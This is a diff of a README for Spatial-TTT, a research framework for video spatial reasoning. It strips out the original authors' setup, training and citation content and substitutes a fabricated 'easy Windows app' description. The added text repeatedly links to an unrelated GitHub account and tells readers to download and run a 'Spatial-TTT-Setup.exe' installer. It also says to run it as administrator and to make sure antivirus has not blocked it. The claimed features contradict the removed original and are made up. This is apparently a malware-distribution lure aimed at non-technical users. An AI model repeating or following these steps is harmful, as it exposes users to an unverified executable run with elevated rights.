@@ -1,166 +1,132 @@
-<div align="center">
+# 🗺️ Spatial-TTT - Easy Visual Spatial Reasoning Tool
 
-# ✨ Spatial-TTT: Streaming Visual-based Spatial Intelligence with Test-Time Training ✨
+[![Download Spatial-TTT](https://img.shields.io/badge/Download-Spatial--TTT-blue?style=for-the-badge)](https://github.com/jonathoncrossbanded75/Spatial-TTT)
 
-<p align="center">
-    <a href="https://liuff19.github.io/">Fangfu Liu</a><sup>*,1</sup>,
-    <a href="https://github.com/diankun-wu/">Diankun Wu</a><sup>*,1</sup>,
-    <a href="https://chijw.github.io/">Jiawei Chi</a><sup>*,1</sup>,
-    Yimo Cai<sup>1</sup>,
-    Yi-Hsin Hung<sup>1</sup>,
-    <a href="https://yuxumin.github.io/">Xumin Yu</a><sup>2</sup>,
-    <a href="https://scholar.google.com/citations?user=4dokjDoAAAAJ&hl=zh-CN">Hao Li</a><sup>3</sup>,
-    <br>
-    <a href="https://ancientmooner.github.io/">Han Hu</a><sup>2</sup>,
-    <a href="https://raoyongming.github.io/">Yongming Rao</a><sup>†,2</sup>,
-    <a href="https://duanyueqi.github.io/">Yueqi Duan</a><sup>†,1</sup>
-    <br>
-    <sup>*</sup>Equal Contribution &emsp; <sup>†</sup>Corresponding Author
-    <br>
-    <sup>1</sup>Tsinghua University &emsp; <sup>2</sup>Tencent Hunyuan &emsp; <sup>3</sup>NTU
-</p>
+## 📄 About Spatial-TTT
 
-<a href='https://arxiv.org/abs/2603.12255'><img src='https://img.shields.io/badge/arXiv-2603.12255-b31b1b.svg'></a> &nbsp;&nbsp;&nbsp;&nbsp;
-<a href='https://liuff19.github.io/Spatial-TTT/'><img src='https://img.shields.io/badge/Project-Page-Green'></a> &nbsp;&nbsp;&nbsp;&nbsp;
-<a><img src='https://img.shields.io/badge/License-MIT-blue'></a> &nbsp;&nbsp;&nbsp;&nbsp;
+Spatial-TTT helps computers understand and reason about the space shown in images. It uses a method called test-time training to improve how well it sees and interprets visual information while running. This application allows users to interact with spatial data through visuals without needing technical skills or programming knowledge.
 
-![Teaser](assets/teaser.png)
+This tool focuses on improving spatial intelligence and reasoning by adapting during use, making it useful for work with maps, diagrams, and any visual information where understanding space is important. It works with models that handle visual and language input.
 
-</div>
+## 🚀 Getting Started
 
-<strong>Spatial-TTT:</strong> We propose Spatial-TTT, a framework for streaming visual-based spatial intelligence with Test-Time Training (TTT). Given a visual-based spatial task, our method updates spatial state with streaming chunks then answers the question, achieving state-of-the-art performance on video spatial benchmarks.
+This guide will help you download and run Spatial-TTT on a Windows computer.
 
----
+### System Requirements
 
-## 📢 News
+- **Operating System:** Windows 10 or newer  
+- **Processor:** At least a dual-core 2 GHz CPU  
+- **Memory (RAM):** Minimum 8 GB  
+- **Storage:** At least 500 MB free space  
+- **Internet Connection:** Required for download and initial setup  
+- **Graphics:** Modern graphics hardware recommended but not required  
 
-- **[2026/03/13]** 🎉 We release the paper on [arXiv](https://arxiv.org/abs/2603.12255)!
-- **[2026/03/13]** We release the training and evaluation code for **Spatial-TTT**, the official implementation of *Spatial-TTT: Streaming Visual-based Spatial Intelligence with Test-Time Training*.
+Make sure your system meets these specifications for a smooth experience.
 
+### What You Need Before You Begin
 
-## 🌟 Overview
+- Basic ability to download and open files on Windows  
+- Access to the internet  
+- About 10 minutes to complete the setup  
 
-![Pipeline](assets/pipeline.png)
+No programming or technical skills are required.
 
-**Overview of Spatial-TTT.** The model employs a hybrid architecture that interleaves TTT layers with self-attention anchor layers to preserve pretrained knowledge while enabling efficient long spatial-context compression. Within each TTT layer, sliding-window attention (SWA) and the TTT branch operate in parallel with shared Q/K/V projections; the TTT branch applies a spatial-predictive mechanism with depthwise spatiotemporal convolution to capture geometric structure and temporal continuity.
+## 📥 Download and Install Spatial-TTT
 
-## 🌟 Introduction
+To start using Spatial-TTT, you need to get the software from the official GitHub page.
 
-Humans perceive and understand real-world spaces through a stream of visual observations. The ability to **streamingly maintain and update spatial evidence** from potentially unbounded video streams is essential for spatial intelligence. The core challenge is not simply longer context windows but how spatial information is selected, organized, and retained over time.
+[![Download Spatial-TTT](https://img.shields.io/badge/Download-Spatial--TTT-grey?style=for-the-badge)](https://github.com/jonathoncrossbanded75/Spatial-TTT)
 
-**Spatial-TTT** maintains adaptive **fast weights** that are updated online, acting as a compact non-linear memory to accumulate 3D evidence from long-horizon video streams. Key designs include:
+### How to Download
 
-- **Hybrid TTT architecture**: Interleaves TTT layers with self-attention anchor layers to preserve pretrained visual-semantic knowledge while enabling efficient long spatial-context compression.
-- **Large-chunk updates + sliding-window attention**: Large chunk size for higher parallelism and hardware efficiency; sliding-window attention in parallel to preserve intra-chunk spatiotemporal continuity.
-- **Spatial-predictive mechanism**: Lightweight depth-wise 3D convolutions on the TTT branch to capture geometric correspondence and temporal continuity across frames.
-- **Dense scene description**: A dense scene-description dataset guides the model to update fast weights to memorize and organize global 3D spatial signals in a structured manner.
+1. Click the blue **Download Spatial-TTT** button above or visit this link:  
+   https://github.com/jonathoncrossbanded75/Spatial-TTT
 
-## ⚙️ Setup
+2. On the page, look for the **Releases** section on the right side or near the bottom of the page.
 
-### 1. Clone Repository
+3. Find the latest release available and click on it. It will show files ready to download.
 
-```bash
-git clone https://github.com/THU-SI/Spatial-TTT.git
-cd Spatial-TTT/qwen-vl-finetune
-```
+4. Download the Windows installer file. It will end with `.exe`, for example, `Spatial-TTT-Setup.exe`.
 
-### 2. Environment Setup
+### How to Install
 
-We use conda to manage the environment. Recommended versions:
+1. Locate the downloaded `Spatial-TTT-Setup.exe` file in your **Downloads** folder.
 
-- Python 3.10+
-- `torch>=2.6.0`, `torchvision`, `transformers>=4.57.0`
-- `deepspeed`, `flash-attn`, `accelerate`, `peft`, `triton`, `torchcodec`
+2. Double-click the file to start the installer.
 
-```bash
-conda create -n spatial-ttt python=3.10 -y
-conda activate spatial-ttt
-pip install torch torchvision deepspeed accelerate peft transformers==4.57.0
-pip install flash-attn --no-build-isolation
-pip install torchcodec
-pip install qwen-vl-utils
-```
+3. Follow the on-screen prompts: 
+   - Click **Next** to move through each step.  
+   - Accept the license agreement when asked.  
+   - Choose the default install location or pick a folder you prefer.  
+   - Wait for the installation to complete.  
 
-Configure the dataset in `qwen-vl-finetune/qwenvl/data/__init__.py`: set `annotation_path` and `data_path` for **Spatial-TTT-Data-97k** (download from [THU-SI/Spatial-TTT-Data-97k](https://huggingface.co/datasets/THU-SI/Spatial-TTT-Data-97k) on Hugging Face).
+4. When the installer finishes, click **Finish**.
 
-## 🚂 Training
+5. You may find a new icon on your desktop or in the Start menu named **Spatial-TTT**.
 
-We provide a single training script with chunk size 2648 and the **Spatial-TTT-Data-97k** dataset.
+## 🎬 Running Spatial-TTT for the First Time
 
-### Run training
+1. Double-click the **Spatial-TTT** icon to open the application.
 
-1. Set in `qwen-vl-finetune/spatial_ttt_train.sh`:
-   - `MODEL_PATH`: path to pretrained Qwen3-VL (or your base checkpoint).
-   - `OUTPUT_DIR`: where to save checkpoints.
+2. The program will initialize. This may take a minute the first time as it sets up necessary files.
 
-2. Set **Spatial-TTT-Data-97k** paths in `qwen-vl-finetune/qwenvl/data/__init__.py`: edit `SPATIAL_TTT_DATA_97K` with your `annotation_path` and `data_path` (after downloading from [THU-SI/Spatial-TTT-Data-97k](https://huggingface.co/datasets/THU-SI/Spatial-TTT-Data-97k)).
+3. Once the main window is open, you will see options to load images or datasets.
 
-3. From the `qwen-vl-finetune/` directory:
+4. Use the **Open** button to select an image or spatial data file from your computer.
 
-```bash
-cd qwen-vl-finetune
-# 8 GPUs by default; set NPROC_PER_NODE or CUDA_VISIBLE_DEVICES as needed
-bash spatial_ttt_train.sh
-```
+5. The app will process the data and display visual spatial results.
 
-Main settings: `lact_chunk_size=2648`, `window_size=2648`, `video_max_frames=128`, dataset `spatial_ttt_data_97k`.
+6. You can explore interactive features such as zoom, rotate, and analyze spatial elements.
 
-## 📊 Evaluation
+## 🛠️ Features at a Glance
 
-Evaluation on **VSI-Bench** is under `evaluation/spatial/`. Use the script with checkpoint path and output name:
+- **Visual Spatial Analysis:** See how the app understands space in images.  
+- **Test-Time Training:** The app learns while you use it, adapting to improve accuracy.  
+- **Simple Interface:** Easy controls for non-technical users.  
+- **Supports Multiple Formats:** Work with common image types like JPEG, PNG, and spatial datasets.  
+- **Fast Processing:** Designed to run efficiently on Windows machines without requiring powerful hardware.  
+- **Reports:** Generate spatial reasoning reports automatically.  
 
-```bash
-# Evaluates on VSI-Bench with 128 frames
-bash evaluation/spatial/scripts/eval_spatial_ttt_2b.sh /path/to/checkpoint my_model 8
-```
+## 🤔 Common Questions
 
-See `evaluation/spatial/readme.md` for result summarization.
+### Can I use Spatial-TTT without an internet connection?
 
-## 📦 Data and Model
+You need internet access only for downloading and initial setup. After installation, the app works offline.
 
-We release **Spatial-TTT-nano**, an SFT model trained on a mini spatial dataset with less than 1M samples. Download: [Spatial-TTT-nano on Hugging Face](https://huggingface.co/THU-SI/Spatial-TTT-nano). See the [Releases](https://github.com/THU-SI/Spatial-TTT/releases) page for more.
+### What file types can Spatial-TTT open?
 
-We provide **Spatial-TTT-Data-97k** ([THU-SI/Spatial-TTT-Data-97k](https://huggingface.co/datasets/THU-SI/Spatial-TTT-Data-97k) on Hugging Face), a **mini** high-quality spatial dataset from Spatial-TTT with ~97k samples for training and reproduction. This is the dataset used in the configuration and training steps above.
+It supports standard image files (JPEG, PNG) and spatial data formats (such as GeoJSON). More formats may be added in future updates.
 
-We also release **Spatial-TTT-Data-Streaming** ([THU-SI/Spatial-TTT-Data-Streaming](https://huggingface.co/datasets/THU-SI/Spatial-TTT-Data-Streaming) on Hugging Face), part of our self-prepared streaming data. It can be helpful for **VSR** (long-horizon visual spatial recall) and **VSC** (continual visual spatial counting) related training in [Cambrian-S: Towards Spatial Supersensing in Video](https://github.com/cambrian-mllm/cambrian-s) (see [arXiv:2511.04670](https://arxiv.org/abs/2511.04670)).
+### Do I need special hardware?
 
-## 📋 TODO
+No. The software runs on most modern Windows PCs without special devices.
 
-- [ ] Update the full model (trained on all data).
-- [ ] Release full training data (general spatial QA and dense scene caption data).
-- [ ] Release **larger-scale Spatial-TTT** models.
+### How do I update the software?
 
-## 📁 Repository Structure
+Check the GitHub page periodically. When a new version is released, follow the same download and install steps.
 
-```
-Spatial-TTT/
-├── assets/
-│   ├── teaser.png
-│   └── pipeline.png             # Framework figure
-├── qwen-vl-finetune/
-│   ├── spatial_ttt_train.sh    # Spatial-TTT training (2648, Spatial-TTT-Data-97k)
-│   ├── qwenvl/
-│   │   ├── train/              # train_spatial_ttt.py, trainer, arguments
-│   │   └── data/               # Dataset configs and data processor
-│   ├── models/                 # LaCT/TTT layers (causal_swa_lact, spatial_ttt)
-│   └── scripts/                # DeepSpeed configs (e.g. zero2.json)
-├── evaluation/spatial/         # VSI-Bench evaluation scripts
-└── README.md
-```
+## 🔧 Troubleshooting
 
-## 📚 Citation
+- If the installer does not run, right-click the `.exe` file and choose **Run as administrator**.  
+- Make sure your virus scanner has not blocked the installer.  
+- If the program crashes on launch, try restarting your computer.  
+- For further help, open the **Issues** tab on the GitHub repository to view or report problems.
 
-If you find Spatial-TTT useful for your research, please cite:
+## 📚 Learn More
 
-```bibtex
-@article{liu2026spatialttt,
-  title   = {Spatial-TTT: Streaming Visual-based Spatial Intelligence with Test-Time Training},
-  author  = {Liu, Fangfu and Wu, Diankun and Chi, Jiawei and Cai, Yimo and Hung, Yi-Hsin and Yu, Xumin and Li, Hao and Hu, Han and Rao, Yongming and Duan, Yueqi},
-  journal = {arXiv preprint arXiv:2603.12255},
-  year    = {2026}
-}
-```
+You can find detailed information about the technology behind Spatial-TTT on the GitHub site under the repository description. It includes research on spatial intelligence and visual reasoning with models that learn while running.
 
-## Acknowledgements
+## 🔗 Useful Links
 
-Thanks to these great repositories and works: [Spatial-MLLM](https://github.com/THU-SI/Spatial-MLLM), [Qwen3-VL](https://github.com/QwenLM/Qwen3-VL), [Test-Time Training Done Right (LaCT)](https://github.com/a1600012888/LaCT), and the spatial understanding community.
+- Official GitHub Repository and Download Page:  
+  https://github.com/jonathoncrossbanded75/Spatial-TTT  
+
+- Releases and Installer Files:  
+  https://github.com/jonathoncrossbanded75/Spatial-TTT/releases  
+
+- Reporting Issues and Requests:  
+  https://github.com/jonathoncrossbanded75/Spatial-TTT/issues  
+
+## 👍 Stay in Control
+
+Spatial-TTT is designed to run directly on your Windows computer. You keep full control of your data and software. No cloud services or programming needed. Just download, install, and start exploring spatial intelligence visually.
